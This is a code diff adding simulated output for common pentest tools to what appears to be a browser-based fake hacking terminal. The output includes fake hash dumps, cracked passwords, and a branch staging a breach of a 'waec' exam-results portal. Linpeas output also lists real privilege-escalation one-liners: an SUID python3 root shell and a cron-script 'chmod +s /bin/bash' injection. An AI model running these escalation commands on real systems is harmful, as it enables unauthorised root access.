+    const url    = a.find(x => !x.startsWith('-')) || 'http://target.local';
+    const method = (() => { const i=a.indexOf('-X'); return i>=0?a[i+1]:'GET'; })();
+    const isHead = a.includes('-I');
+    const isVerbose = a.includes('-v') || a.includes('-i');
+    const postData = (() => { const i=a.indexOf('-d'); return i>=0?a[i+1]:null; })();
+    const header = (() => { const i=a.indexOf('-H'); return i>=0?a[i+1]:null; })();
+
+    // Detect URL pattern for varied responses
+    const isLogin    = url.includes('login') || url.includes('admin');
+    const isApi      = url.includes('api') || url.includes('/v1') || url.includes('/v2');
+    const isUpload   = url.includes('upload');
+    const isRobots   = url.includes('robots');
+    const isWaec     = url.includes('waec');
+    const isPhp      = url.includes('.php');
+
+    const host = (() => { try { return new URL(url.startsWith('http')?url:'http://'+url).hostname; } catch(e){ return url; } })();
+    const date = new Date().toUTCString();
+
+    const headers = [
+      {t:`*   Trying ${host}...`,c:'dim'},
+      {t:`* Connected to ${host} port 80`,c:'dim'},
+    ];
+
+    if(isVerbose) headers.push(
+      {t:`> ${method} ${url.replace(/https?:\/\/[^/]+/,'')||'/'} HTTP/1.1`,c:'cyan'},
+      {t:`> Host: ${host}`,c:'cyan'},
+      {t:`> User-Agent: curl/8.4.0`,c:'cyan'},
+      {t:`> Accept: */*`,c:'cyan'},
+      ...(header?[{t:`> ${header}`,c:'cyan'}]:[]),
+      ...(postData?[{t:`> Content-Length: ${postData.length}`,c:'cyan'},{t:`> Content-Type: application/x-www-form-urlencoded`,c:'cyan'}]:[]),
+      {t:'>',c:'cyan'},{t:'',c:''},
+      {t:'< HTTP/1.1 200 OK',c:'green'},
+      {t:`< Date: ${date}`,c:'green'},
+      {t:'< Server: Apache/2.4.54 (Ubuntu)',c:'green'},
+      {t:'< X-Powered-By: PHP/8.1.2',c:'green'},
+      {t:'< Content-Type: text/html; charset=UTF-8',c:'green'},
+      {t:'<',c:'green'},{t:'',c:''},
+    );
+
+    if(isHead) return [
+      ...headers,
+      {t:'HTTP/1.1 200 OK',c:'green'},
+      {t:`Date: ${date}`,c:''},
+      {t:'Server: Apache/2.4.54 (Ubuntu)',c:''},
+      {t:'X-Powered-By: PHP/8.1.2',c:'yellow'},
+      {t:'X-Frame-Options: SAMEORIGIN',c:''},
+      {t:'Content-Type: text/html; charset=UTF-8',c:''},
+      {t:'Content-Length: 4823',c:''},
+      {t:'Connection: keep-alive',c:''},
+    ];
+
+    if(isRobots) return [
+      ...headers,
+      {t:'User-agent: *',c:''},
+      {t:'Disallow: /admin/',c:'red'},
+      {t:'Disallow: /backup/',c:'red'},
+      {t:'Disallow: /config.php',c:'red'},
+      {t:'Disallow: /uploads/',c:'yellow'},
+      {t:'Allow: /',c:'green'},
+    ];
+
+    if(isWaec) return [
+      ...headers,
+      {t:'HTTP/1.1 200 OK',c:'green'},
+      {t:`Date: ${date}`,c:'dim'},
+      {t:'Server: nginx/1.18.0',c:''},
+      {t:'Content-Type: application/json',c:''},
+      {t:'',c:''},
+      {t:'{',c:'cyan'},
+      {t:'  "status": "success",',c:'cyan'},
+      {t:'  "endpoint": "/uploads",',c:'cyan'},
+      {t:'  "files": [',c:'cyan'},
+      {t:'    "results_2024.pdf",',c:'green'},
+      {t:'    "candidates.csv",',c:'green'},
+      {t:'    "admin_export.zip"',c:'green'},
+      {t:'  ],',c:'cyan'},
+      {t:'  "server": "waec-portal-v2.3"',c:'cyan'},
+      {t:'}',c:'cyan'},
+    ];
+
+    if(isApi) return [
+      ...headers,
+      {t:'{',c:'cyan'},
+      {t:'  "status": "ok",',c:'cyan'},
+      {t:`  "host": "${host}",`,c:'cyan'},
+      {t:'  "version": "2.1.0",',c:'cyan'},
+      {t:'  "auth": "required",',c:'yellow'},
+      {t:'  "endpoints": ["/login","/users","/admin","/data"]',c:'cyan'},
+      {t:'}',c:'cyan'},
+    ];
+
+    if(isLogin || postData) return [
+      ...headers,
+      {t:'HTTP/1.1 302 Found',c:'yellow'},
+      {t:`Location: ${url.replace('login','dashboard')}`,c:'yellow'},
+      {t:'Set-Cookie: PHPSESSID=abc123def456; path=/; HttpOnly',c:'green'},
+      {t:'Set-Cookie: auth_token=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx; Secure',c:'green'},
+      {t:'',c:''},
+      {t:'<!-- Redirecting to dashboard -->',c:'dim'},
+    ];
+
+    if(isUpload) return [
+      ...headers,
+      {t:'HTTP/1.1 200 OK',c:'green'},
+      {t:'Content-Type: application/json',c:''},
+      {t:'',c:''},
+      {t:'{"uploads":["shell.php","backup.tar.gz","config.bak"],"writable":true}',c:'cyan'},
+    ];
+
+    // Default HTML response
+    return [
+      ...headers,
+      {t:'<!DOCTYPE html>',c:'dim'},
+      {t:`<html>`,c:'dim'},
+      {t:'<head>',c:'dim'},
+      {t:`  <title>${host} — Login</title>`,c:''},
+      {t:'</head>',c:'dim'},
+      {t:'<body>',c:'dim'},
+      {t:`  <h1>Welcome to ${host}</h1>`,c:''},
+      {t:'  <!-- TODO: remove debug mode before production -->',c:'red'},
+      {t:'  <!-- DB_PASS=s3cr3t123 -->',c:'red'},
+      {t:'  <form action="/login" method="POST">',c:''},
+      {t:'    <input name="username" type="text">',c:''},
+      {t:'    <input name="password" type="password">',c:''},
+      {t:'    <button type="submit">Login</button>',c:''},
+      {t:'  </form>',c:''},
+      {t:'</body>',c:'dim'},
+      {t:'</html>',c:'dim'},
+      {t:'',c:''},
+      {t:`* Connection #0 to host ${host} left intact`,c:'dim'},
+    ];
+  },
+
+  wget:(a)=>{
+    if(!a.length) return [
+      {t:'wget — non-interactive network downloader',c:'yellow'},
+      {t:'Usage: wget [OPTIONS] URL',c:''},
+      {t:'  -O FILE    save to filename',c:'dim'},
+      {t:'  -q         quiet mode',c:'dim'},
+      {t:'  -r         recursive download',c:'dim'},
+      {t:'  --no-check-certificate  skip SSL verify',c:'dim'},
+    ];
+    const url  = a.find(x=>!x.startsWith('-')) || 'http://target.local/file';
+    const oi   = a.indexOf('-O'); const outfile = oi>=0?a[oi+1]:url.split('/').pop()||'index.html';
+    const host = (() => { try { return new URL(url.startsWith('http')?url:'http://'+url).hostname; } catch(e){ return url; } })();
+    const size = Math.floor(Math.random()*900+100);
+    return [
+      {t:`--${new Date().toLocaleString()}--  ${url}`,c:'dim'},
+      {t:`Resolving ${host}... 192.168.1.42`,c:''},
+      {t:`Connecting to ${host}|192.168.1.42|:80... connected.`,c:''},
+      {t:`HTTP request sent, awaiting response... 200 OK`,c:'green'},
+      {t:`Length: ${size*1024} (${size}K) [application/octet-stream]`,c:''},
+      {t:`Saving to: '${outfile}'`,c:''},
+      {t:'',c:''},
+      {t:`${outfile}          100%[===================>] ${size}K  1.2MB/s    in 0.1s`,c:'green'},
+      {t:'',c:''},
+      {t:`${new Date().toLocaleString()} (1.20 MB/s) - '${outfile}' saved [${size*1024}/${size*1024}]`,c:'dim'},
+    ];
+  },
+
+  gobuster:(a)=>{
+    if(!a.length) return [
+      {t:'Gobuster v3.6 — directory/file/DNS brute-forcer',c:'yellow'},
+      {t:'Usage: gobuster dir -u URL -w WORDLIST [-x EXTENSIONS]',c:''},
+      {t:'       gobuster dns -d DOMAIN -w WORDLIST',c:''},
+      {t:'  -u   target URL',c:'dim'},{t:'  -w   wordlist path',c:'dim'},
+      {t:'  -x   file extensions (php,html,txt)',c:'dim'},{t:'  -t   threads (default 10)',c:'dim'},
+    ];
+    const ui=a.indexOf('-u'); const url=ui>=0?a[ui+1]:'http://target.local';
+    const wi=a.indexOf('-w'); const wl=wi>=0?a[wi+1]:'common.txt';
+    const xi=a.indexOf('-x'); const ext=xi>=0?a[xi+1]:'php,html';
+    const mode=a[0]||'dir';
+    return [
+      {t:`Gobuster v3.6 — Mode: ${mode}`,c:'yellow'},
+      {t:`Target: ${url}  Wordlist: ${wl}`,c:'dim'},{t:'',c:''},
+      {t:'===============================================================',c:'dim'},
+      {t:`Starting gobuster in ${mode.toUpperCase()} enumeration mode`,c:''},
+      {t:'===============================================================',c:'dim'},
+      {t:'/admin                (Status: 301) [Size: 312] [--> /admin/]',c:'green'},
+      {t:'/backup               (Status: 200) [Size: 1024]',c:'green'},
+      {t:'/config.php           (Status: 200) [Size: 89]',c:'green'},
+      {t:'/login                (Status: 200) [Size: 2341]',c:'green'},
+      {t:'/uploads              (Status: 301) [Size: 315] [--> /uploads/]',c:'green'},
+      {t:'/robots.txt           (Status: 200) [Size: 45]',c:'cyan'},
+      {t:'/.git                 (Status: 403) [Size: 278]',c:'yellow'},
+      {t:'/wp-admin             (Status: 301) [Size: 316]',c:'green'},
+      {t:'/phpmyadmin           (Status: 200) [Size: 10531]',c:'red'},
+      {t:'',c:''},{t:'===============================================================',c:'dim'},
+      {t:`Finished — 9 findings in ${(Math.random()*8+2).toFixed(2)}s`,c:'dim'},
+    ];
+  },
+
+  nikto:(a)=>{
+    if(!a.length) return [
+      {t:'Nikto v2.1.6 — web server scanner',c:'yellow'},
+      {t:'Usage: nikto -h TARGET [-p PORT] [-ssl]',c:''},
+      {t:'  -h   target host/URL',c:'dim'},{t:'  -p   port (default 80)',c:'dim'},
+      {t:'  -ssl use SSL/HTTPS',c:'dim'},
+    ];
+    const hi=a.indexOf('-h'); const host=hi>=0?a[hi+1]:'192.168.1.1';
+    const pi=a.indexOf('-p'); const port=pi>=0?a[pi+1]:'80';
+    return [
+      {t:`- Nikto v2.1.6 / Target: ${host}:${port}`,c:'yellow'},
+      {t:`- Start Time: ${new Date().toLocaleString()}`,c:'dim'},{t:'',c:''},
+      {t:`+ Server: Apache/2.4.54 (Ubuntu)`,c:'green'},
+      {t:'+ /: The anti-clickjacking X-Frame-Options header is not present.',c:'yellow'},
+      {t:'+ /: The X-Content-Type-Options header is not set.',c:'yellow'},
+      {t:'+ /robots.txt: contains 3 entries which should be manually reviewed.',c:'cyan'},
+      {t:'+ Apache/2.4.54 appears to be outdated (current: 2.4.58)',c:'yellow'},
+      {t:'+ /config.php: PHP Config file may contain database passwords.',c:'red'},
+      {t:'+ /admin/: Admin login page found.',c:'red'},
+      {t:'+ /phpmyadmin/: phpMyAdmin directory found (CVE-2007-5797)',c:'red'},
+      {t:'+ /backup/: Backup directory found — may contain sensitive data.',c:'red'},
+      {t:'+ OSVDB-3233: /icons/README: Apache default file found.',c:'yellow'},
+      {t:'+ OSVDB-630: IIS may reveal its internal IP when an HTTP request with Host: 1 is sent.',c:'yellow'},
+      {t:'',c:''},{t:`+ 8 issues found in ${(Math.random()*60+20).toFixed(0)}s`,c:'dim'},
+    ];
+  },
+
+  hashcat:(a)=>{
+    if(!a.length) return [
+      {t:'hashcat v6.2.6 — advanced password recovery',c:'yellow'},
+      {t:'Usage: hashcat -m MODE -a ATTACK hashfile wordlist',c:''},
+      {t:'  Common modes: 0=MD5  100=SHA1  1000=NTLM  1800=sha512crypt',c:'dim'},
+      {t:'  Attack types: 0=dictionary  3=brute-force  6=hybrid',c:'dim'},
+    ];
+    const mi=a.indexOf('-m'); const mode=mi>=0?a[mi+1]:'0';
+    const ai=a.indexOf('-a'); const atk=ai>=0?a[ai+1]:'0';
+    const modeNames={0:'MD5',100:'SHA1',1000:'NTLM',1800:'sha512crypt',3200:'bcrypt'};
+    const modeName=modeNames[mode]||`mode-${mode}`;
+    return [
+      {t:'hashcat v6.2.6 starting...',c:'yellow'},{t:'',c:''},
+      {t:`Hash-Mode: ${mode} (${modeName})  Attack-Mode: ${atk} (${atk==='3'?'Brute-force':'Dictionary'})`,c:''},
+      {t:'Device #1: NVIDIA RTX 4090, 24268/24576 MB, 128MCU',c:'dim'},
+      {t:'',c:''},
+      {t:'5f4dcc3b5aa765d61d8327deb882cf99:password123',c:'green'},
+      {t:'f28e6d4b62f5f0a0d0b7e4e4a4038e16:toor',c:'green'},
+      {t:'0d107d09f5bbe40cade3de5c71e9e9b7:letmein',c:'green'},
+      {t:'aab3238922bcc25a6f606eb525ffdc56:1234',c:'green'},
+      {t:'',c:''},
+      {t:`Session..........: hashcat`,c:'dim'},
+      {t:`Status...........: Cracked`,c:'green'},
+      {t:`Hash.Mode........: ${mode} (${modeName})`,c:''},
+      {t:`Recovered........: 4/4 (100.00%) digests`,c:'green'},
+      {t:`Speed.#1.........: 14823.4 MH/s`,c:''},
+      {t:`Time.Estimated...: ${new Date().toLocaleString()}`,c:'dim'},
+    ];
+  },
+
+  nc:(a)=>{
+    if(!a.length) return [
+      {t:'Netcat (nc) — network utility',c:'yellow'},
+      {t:'Usage: nc [OPTIONS] HOST PORT',c:''},
+      {t:'  -l        listen mode',c:'dim'},{t:'  -v        verbose',c:'dim'},
+      {t:'  -n        no DNS resolution',c:'dim'},{t:'  -e FILE   execute on connect',c:'dim'},
+      {t:'  -z        port scan mode',c:'dim'},
+    ];
+    const listen=a.includes('-l');
+    const zScan=a.includes('-z');
+    const host=a.find(x=>!x.startsWith('-'))||'192.168.1.1';
+    const port=a.filter(x=>!x.startsWith('-')).slice(-1)[0]||'4444';
+    if(listen) return [
+      {t:`Listening on 0.0.0.0 ${port}`,c:'yellow'},
+      {t:`Connection received on ${host} ${Math.floor(Math.random()*10000+40000)}`,c:'green'},
+      {t:'',c:''},{t:'id',c:'dim'},
+      {t:'uid=0(root) gid=0(root) groups=0(root)',c:'green'},
+      {t:'whoami',c:'dim'},{t:'root',c:'green'},
+    ];
+    if(zScan) return [
+      {t:`Scanning ${host} for open ports...`,c:'dim'},
+      {t:`${host} 22 (ssh) open`,c:'green'},
+      {t:`${host} 80 (http) open`,c:'green'},
+      {t:`${host} 443 (https) open`,c:'green'},
+      {t:`${host} 3306 (mysql) open`,c:'green'},
+    ];
+    return [
+      {t:`${host} [${host}] ${port} (?) open`,c:'green'},
+      {t:'',c:''},{t:'(connection established — type to interact)',c:'dim'},
+    ];
+  },
+
+  netcat:(a)=>cmds.nc(a),
+
+  enum4linux:(a)=>{
+    const tgt=a.find(x=>!x.startsWith('-'))||'192.168.1.1';
+    return [
+      {t:`Starting enum4linux v0.9.1 against ${tgt}`,c:'yellow'},{t:'',c:''},
+      {t:'========================( Target Info )========================',c:'cyan'},
+      {t:`Target ............ ${tgt}`,c:''},{t:'RID Range ......... 500-550,1000-1050',c:''},
+      {t:'Username .......... ""',c:''},{t:'Password .......... ""',c:''},{t:'',c:''},
+      {t:'===================( Workgroup/Domain )===================',c:'cyan'},
+      {t:`[+] Got domain/workgroup name: WORKGROUP`,c:'green'},{t:'',c:''},
+      {t:'===================( OS Info )===================',c:'cyan'},
+      {t:'[+] Got OS info for via smbclient: Windows 7 SP1 (build 7601)',c:'green'},{t:'',c:''},
+      {t:'===================( Users )===================',c:'cyan'},
+      {t:`[+] Enumerating users using SID S-1-22-1`,c:'green'},
+      {t:'S-1-22-1-1000 Unix User\\admin (Local User)',c:''},
+      {t:'S-1-22-1-1001 Unix User\\root  (Local User)',c:''},
+      {t:'S-1-22-1-1002 Unix User\\user  (Local User)',c:''},{t:'',c:''},
+      {t:'===================( Share Enum )===================',c:'cyan'},
+      {t:'[+] Found shares:',c:'green'},
+      {t:'  Sharename   Type  Comment',c:''},
+      {t:'  ADMIN$      Disk  Remote Admin',c:'yellow'},
+      {t:'  C$          Disk  Default share',c:'yellow'},
+      {t:'  IPC$        IPC   Remote IPC',c:''},
+      {t:'  backup      Disk  Backup share',c:'green'},
+      {t:'',c:''},{t:`enum4linux complete — ${new Date().toLocaleString()}`,c:'dim'},
+    ];
+  },
+
+  dirb:(a)=>{
+    if(!a.length) return [
+      {t:'DIRB v2.22 — web content scanner',c:'yellow'},
+      {t:'Usage: dirb URL [WORDLIST] [-a AGENT] [-o OUTPUT]',c:''},
+    ];
+    const url=a[0]||'http://target.local';
+    const wl=a[1]||'/usr/share/dirb/wordlists/common.txt';
+    return [
+      {t:'-----------------',c:'dim'},
+      {t:`DIRB v2.22  By The Dark Raver`,c:'yellow'},
+      {t:'-----------------',c:'dim'},
+      {t:`START_TIME: ${new Date().toLocaleString()}`,c:'dim'},
+      {t:`URL_BASE: ${url}/`,c:''},{t:`WORDLIST_FILE: ${wl}`,c:''},{t:'',c:''},
+      {t:'-----------------',c:'dim'},
+      {t:'GENERATED WORDS: 4612',c:'dim'},{t:'',c:''},
+      {t:'---- Scanning URL: '+url+'/ ----',c:'cyan'},
+      {t:`==> DIRECTORY: ${url}/admin/`,c:'green'},
+      {t:`==> DIRECTORY: ${url}/backup/`,c:'green'},
+      {t:`+ ${url}/index.php (CODE:200|SIZE:2048)`,c:'green'},
+      {t:`+ ${url}/login.php (CODE:200|SIZE:1337)`,c:'green'},
+      {t:`+ ${url}/robots.txt (CODE:200|SIZE:45)`,c:'cyan'},
+      {t:`+ ${url}/server-status (CODE:403|SIZE:278)`,c:'yellow'},
+      {t:'',c:''},
+      {t:'-----------------',c:'dim'},
+      {t:`END_TIME: ${new Date().toLocaleString()}`,c:'dim'},
+      {t:'DOWNLOADED: 4612  FOUND: 6',c:'dim'},
+    ];
+  },
+
+  wpscan:(a)=>{
+    if(!a.length) return [
+      {t:'WPScan v3.8.25 — WordPress security scanner',c:'yellow'},
+      {t:'Usage: wpscan --url URL [--enumerate u,p,t]',c:''},
+      {t:'  --enumerate u   enumerate users',c:'dim'},
+      {t:'  --enumerate p   enumerate plugins',c:'dim'},
+      {t:'  --enumerate t   enumerate themes',c:'dim'},
+      {t:'  --passwords FILE  brute-force logins',c:'dim'},
+    ];
+    const ui=a.indexOf('--url'); const url=ui>=0?a[ui+1]:'http://target.local';
+    const doEnum=a.includes('--enumerate');
+    return [
+      {t:'_______________________________________________________________',c:'dim'},
+      {t:'        __          _______   _____                           ',c:'red'},
+      {t:'        \\ \\        / /  __ \\ / ____|                          ',c:'red'},
+      {t:'         \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __          ',c:'red'},
+      {t:'          \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | \'_ \\         ',c:'red'},
+      {t:'           \\  /\\  /  | |     ____) | (__| (_| | | | |        ',c:'red'},
+      {t:'            \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|        ',c:'red'},
+      {t:'_______________________________________________________________',c:'dim'},
+      {t:`[+] URL: ${url}`,c:''},{t:`[+] Started: ${new Date().toLocaleString()}`,c:'dim'},{t:'',c:''},
+      {t:`[+] WordPress version 6.2.1 detected (Insecure, released 2023-05-20)`,c:'yellow'},
+      {t:'[+] WordPress theme in use: twentytwentyone',c:''},
+      {t:'[!] No WP-Cron disabling detected',c:'yellow'},
+      {t:'[+] XML-RPC seems to be enabled: '+url+'/xmlrpc.php',c:'yellow'},
+      {t:'[+] Upload directory has listing enabled: '+url+'/wp-content/uploads/',c:'red'},
+      ...( doEnum ? [
+        {t:'',c:''},{t:'[+] Enumerating Users...',c:'cyan'},
+        {t:'[i] User(s) Identified:',c:''},
+        {t:' [+] admin  (Roles: administrator)',c:'green'},
+        {t:' [+] editor (Roles: editor)',c:'green'},
+        {t:'',c:''},{t:'[+] Enumerating Plugins...',c:'cyan'},
+        {t:' [!] contact-form-7 v5.7.1 — 2 vulnerabilities found',c:'red'},
+        {t:' [!] woocommerce v7.4.0 — outdated',c:'yellow'},
+      ] : []),
+      {t:'',c:''},{t:`[+] Finished: ${new Date().toLocaleString()}`,c:'dim'},
+      {t:'[+] Requests Done: 342 | Cached: 18 | Data Sent: 89 KB',c:'dim'},
+    ];
+  },
+
+  aircrack:(a)=>{
+    if(!a.length) return [
+      {t:'Aircrack-ng 1.7 — WEP/WPA/WPA2 cracker',c:'yellow'},
+      {t:'Usage: aircrack-ng [options] <capture.cap>',c:''},
+      {t:'  -w WORDLIST   wordlist for WPA cracking',c:'dim'},
+      {t:'  -b BSSID      target AP MAC address',c:'dim'},
+      {t:'  -e ESSID      target network name',c:'dim'},
+      {t:'',c:''},
+      {t:'Tip: First capture handshake with airodump-ng:',c:'cyan'},
+      {t:'  airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0',c:'dim'},
+    ];
+    const wi=a.indexOf('-w'); const wl=wi>=0?a[wi+1]:'rockyou.txt';
+    const bi=a.indexOf('-b'); const bssid=bi>=0?a[bi+1]:'AA:BB:CC:DD:EE:FF';
+    const cap=a.find(x=>x.endsWith('.cap'))||'capture-01.cap';
+    return [
+      {t:`Opening ${cap}`,c:'dim'},
+      {t:'Read 4821 packets.',c:''},
+      {t:`   #  BSSID              ESSID           Encryption`,c:'cyan'},
+      {t:`   1  ${bssid}  HomeNetwork     WPA (1 handshake)`,c:'green'},
+      {t:'',c:''},
+      {t:`Choosing first network as target.`,c:'dim'},
+      {t:`Using wordlist: ${wl}`,c:''},{t:'',c:''},
+      {t:'                               Aircrack-ng 1.7',c:'yellow'},
+      {t:`      [00:00:42] 14820 keys tested (352.41 k/s)`,c:''},
+      {t:'',c:''},
+      {t:'                       KEY FOUND! [ password123 ]',c:'green'},
+      {t:'',c:''},
+      {t:`      Master Key     : A1 B2 C3 D4 E5 F6 07 08 09 0A 0B 0C 0D 0E 0F 10`,c:'dim'},
+      {t:`      Transient Key  : 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF 00`,c:'dim'},
+    ];
+  },
+
+  airodump:(a)=>{
+    return [
+      {t:'',c:''},
+      {t:' CH  6 ][ Elapsed: 30 s ][ 2024-01-15 14:23',c:'dim'},{t:'',c:''},
+      {t:' BSSID              PWR  Beacons  #Data  CH  ENC   ESSID',c:'cyan'},
+      {t:' AA:BB:CC:11:22:33  -42       87    203   6  WPA2  HomeNetwork',c:'green'},
+      {t:' DD:EE:FF:44:55:66  -67       54     12   1  WPA2  Neighbor_5G',c:''},
+      {t:' 00:11:22:33:44:55  -71       31      4  11  WEP   OldRouter',c:'yellow'},
+      {t:' 66:77:88:99:AA:BB  -88       12      0   6  OPN   CoffeeShop',c:'red'},
+      {t:'',c:''},
+      {t:' BSSID              STATION            PWR  Lost  Frames  ESSID',c:'cyan'},
+      {t:' AA:BB:CC:11:22:33  CC:DD:EE:FF:00:11  -55     0     124  HomeNetwork',c:'green'},
+    ];
+  },
+
+  msfvenom:(a)=>{
+    if(!a.length) return [
+      {t:'MsfVenom v6.3.55 — payload generator & encoder',c:'yellow'},
+      {t:'Usage: msfvenom -p PAYLOAD [options] -f FORMAT -o FILE',c:''},
+      {t:'  -p PAYLOAD   payload to use',c:'dim'},
+      {t:'  -f FORMAT    output format (exe,elf,php,py,raw...)',c:'dim'},
+      {t:'  -o FILE      output file',c:'dim'},
+      {t:'  LHOST=IP     listener IP',c:'dim'},
+      {t:'  LPORT=PORT   listener port',c:'dim'},
+      {t:'',c:''},
+      {t:'Common payloads:',c:'cyan'},
+      {t:'  windows/x64/meterpreter/reverse_tcp',c:''},
+      {t:'  linux/x86/meterpreter/reverse_tcp',c:''},
+      {t:'  php/meterpreter/reverse_tcp',c:''},
+    ];
+    const pi=a.indexOf('-p'); const payload=pi>=0?a[pi+1]:'windows/x64/meterpreter/reverse_tcp';
+    const fi=a.indexOf('-f'); const fmt=fi>=0?a[fi+1]:'exe';
+    const oi=a.indexOf('-o'); const out=oi>=0?a[oi+1]:`shell.${fmt}`;
+    const lhost=a.find(x=>x.startsWith('LHOST='))?.split('=')[1]||'192.168.1.42';
+    const lport=a.find(x=>x.startsWith('LPORT='))?.split('=')[1]||'4444';
+    return [
+      {t:`[-] No platform was selected, choosing ${payload.includes('windows')?'Windows':'Linux'}`,c:'dim'},
+      {t:`[-] No arch selected, selecting arch: ${payload.includes('x64')?'x64':'x86'}`,c:'dim'},
+      {t:'No encoder specified, outputting raw payload',c:'dim'},
+      {t:`Payload size: ${Math.floor(Math.random()*200+400)} bytes`,c:''},
+      {t:`Final size of ${fmt} file: ${Math.floor(Math.random()*50000+70000)} bytes`,c:''},
+      {t:`Saved as: ${out}`,c:'green'},
+      {t:'',c:''},
+      {t:`[*] Payload: ${payload}`,c:'cyan'},
+      {t:`[*] LHOST: ${lhost}  LPORT: ${lport}`,c:'cyan'},
+    ];
+  },
+
+  crackmapexec:(a)=>{
+    if(!a.length) return [
+      {t:'CrackMapExec v5.4.0 — swiss army knife for pentesting',c:'yellow'},
+      {t:'Usage: crackmapexec <protocol> <target> [options]',c:''},
+      {t:'  Protocols: smb, ssh, winrm, ftp, ldap, mssql',c:'dim'},
+      {t:'  -u USERNAME   username',c:'dim'},{t:'  -p PASSWORD   password',c:'dim'},
+      {t:'  --shares      enumerate shares',c:'dim'},{t:'  --sam         dump SAM hashes',c:'dim'},
+    ];
+    const proto=a[0]||'smb'; const tgt=a[1]||'192.168.1.0/24';
+    const ui=a.indexOf('-u'); const user=ui>=0?a[ui+1]:'admin';
+    const pi=a.indexOf('-p'); const pass=pi>=0?a[pi+1]:'password123';
+    const doShares=a.includes('--shares'), doSam=a.includes('--sam');
+    const r=[
+      {t:`SMB  192.168.1.10  445  TARGET  [*] Windows 7 SP1 x64 (name:TARGET) (domain:WORKGROUP)`,c:''},
+      {t:`SMB  192.168.1.10  445  TARGET  [+] WORKGROUP\\${user}:${pass} (Pwn3d!)`,c:'green'},
+      {t:`SMB  192.168.1.20  445  DC01    [*] Windows Server 2019 (name:DC01) (domain:corp.local)`,c:''},
+      {t:`SMB  192.168.1.20  445  DC01    [+] corp.local\\${user}:${pass} (Pwn3d!)`,c:'green'},
+    ];
+    if(doShares) r.push(
+      {t:'',c:''},{t:`SMB  192.168.1.10  445  TARGET  [+] Enumerated shares`,c:'cyan'},
+      {t:`SMB  192.168.1.10  445  TARGET  Share        Permissions`,c:'yellow'},
+      {t:`SMB  192.168.1.10  445  TARGET  -----        -----------`,c:'dim'},
+      {t:`SMB  192.168.1.10  445  TARGET  ADMIN$       READ,WRITE`,c:'green'},
+      {t:`SMB  192.168.1.10  445  TARGET  C$           READ,WRITE`,c:'green'},
+      {t:`SMB  192.168.1.10  445  TARGET  backup       READ`,c:'green'},
+    );
+    if(doSam) r.push(
+      {t:'',c:''},{t:`SMB  192.168.1.10  445  TARGET  [+] Dumping SAM hashes`,c:'cyan'},
+      {t:`Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`,c:'green'},
+      {t:`admin:1001:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::`,c:'green'},
+    );
+    return r;
+  },
+
+  linpeas:(a)=>[
+    {t:'',c:''},{t:'   ╔═══════════════════════════════════════════╗',c:'yellow'},
+    {t:'   ║      LinPEAS — Linux Privilege Escalation   ║',c:'yellow'},
+    {t:'   ╚═══════════════════════════════════════════╝',c:'yellow'},{t:'',c:''},
+    {t:'[+] Operative system',c:'cyan'},
+    {t:'  Linux kali 6.6.9-amd64 Kali GNU/Linux',c:''},
+    {t:'',c:''},
+    {t:'[+] Sudo version',c:'cyan'},
+    {t:'  Sudo version 1.9.13p3  (VULNERABLE: CVE-2023-22809)',c:'red'},
+    {t:'',c:''},
+    {t:'[+] SUID binaries',c:'cyan'},
+    {t:'  -rwsr-xr-x root /usr/bin/python3.10',c:'red'},
+    {t:'  -rwsr-xr-x root /usr/bin/find',c:'red'},
+    {t:'  -rwsr-xr-x root /bin/bash',c:'red'},
+    {t:'',c:''},
+    {t:'[+] Interesting files in home directories',c:'cyan'},
+    {t:'  /root/.ssh/id_rsa  (private SSH key found!)',c:'red'},
+    {t:'  /home/user/.bash_history (contains sudo commands)',c:'yellow'},
+    {t:'',c:''},
+    {t:'[+] Cron jobs',c:'cyan'},
+    {t:'  */5 * * * * root /opt/backup.sh',c:'yellow'},
+    {t:'  * * * * * root /tmp/update.sh (writable!)',c:'red'},
+    {t:'',c:''},
+    {t:'  ╔══ Possible PE vectors ═══════════════════════',c:'red'},
+    {t:'  ║  SUID python3 → python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',c:'red'},
+    {t:'  ║  Writable cron → echo "chmod +s /bin/bash" >> /tmp/update.sh',c:'red'},
+    {t:'  ╚══════════════════════════════════════════════',c:'red'},
+  ],
+
+  searchsploit:(a)=>{
+    if(!a.length) return [{t:'Usage: searchsploit <search term>',c:'yellow'},{t:'  Searches Exploit-DB for known exploits',c:'dim'}];
+    const q=a.join(' ');
+    return [
+      {t:'Exploit Title                                            | Path',c:'cyan'},
+      {t:'--------------------------------------------------------- | ----',c:'dim'},
+      {t:`Apache 2.4.54 - Path Traversal (CVE-2021-41773)          | linux/webapps/50512.py`,c:'green'},
+      {t:`Apache 2.4.x - Reverse Proxy SSRF (CVE-2023-25690)       | linux/webapps/51404.txt`,c:'green'},
+      {t:`${q} - Remote Code Execution                             | multiple/remote/42341.py`,c:'green'},
+      {t:`${q} 2.x - Authenticated RCE (CVE-2022-1388)            | php/webapps/50618.py`,c:'green'},
+      {t:`${q} < 3.0 - SQL Injection                              | php/webapps/44583.txt`,c:'green'},
+      {t:'',c:''},{t:'ShellCodes: No Results',c:'dim'},
+    ];
+  },
+
+  msfconsole:()=>{
+    msfActive=true; msfModule=null;
+    msfOpts={RHOSTS:'',LHOST:'192.168.1.42',LPORT:'4444',PAYLOAD:''};
+    setTimeout(()=>{ addMsfInput(); scrollBottom(); },80);
+    return [
+      {t:'',c:''},
+      {t:'  ██╗███╗   ███╗███████╗███████╗',c:'red'},
+      {t:'  ██║████╗ ████║██╔════╝██╔════╝',c:'red'},
+      {t:'  ██║██╔████╔██║███████╗█████╗  ',c:'red'},
+      {t:'  ██║██║╚██╔╝██║╚════██║██╔══╝  ',c:'red'},
+      {t:'  ██║██║ ╚═╝ ██║███████║██║     ',c:'red'},
+      {t:'  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     Metasploit v6.3.55',c:'red'},{t:'',c:''},
+      {t:'  2364 exploits · 1028 post · 597 payloads · 9 evasion',c:'cyan'},
